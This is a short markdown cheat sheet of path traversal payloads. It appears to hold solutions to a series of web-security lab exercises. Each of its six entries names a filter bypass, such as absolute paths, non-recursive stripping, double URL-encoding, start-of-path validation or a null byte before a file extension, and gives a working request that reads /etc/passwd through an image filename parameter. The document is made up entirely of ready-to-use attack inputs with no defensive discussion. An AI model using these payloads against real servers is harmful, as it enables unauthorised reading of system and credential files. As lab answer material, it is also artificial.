
### File Path Travel, Simple Case
**Payload** :
```
/image?filename=../../../../etc/passwd
```

### File path traversal, traversal sequences blocked with absolute path bypass
**Payload** :
```
/image?filename=/etc/passwd
```

### File path traversal, traversal sequences stripped non-recursively
```
/image?filename=....//....//....//....//etc//passwd
```

### File path traversal, traversal sequences stripped with superfluous URL-decode
```
/image?filename=..%252f..%252f..%252fetc%2fpasswd
```

### File path traversal, validation of start of path
```
/image?filename=/var/www/images/../../../etc/passwd
```

### File path traversal, validation of file extension with null byte bypass
```
/image?filename=../../../etc/passwd%00.png
```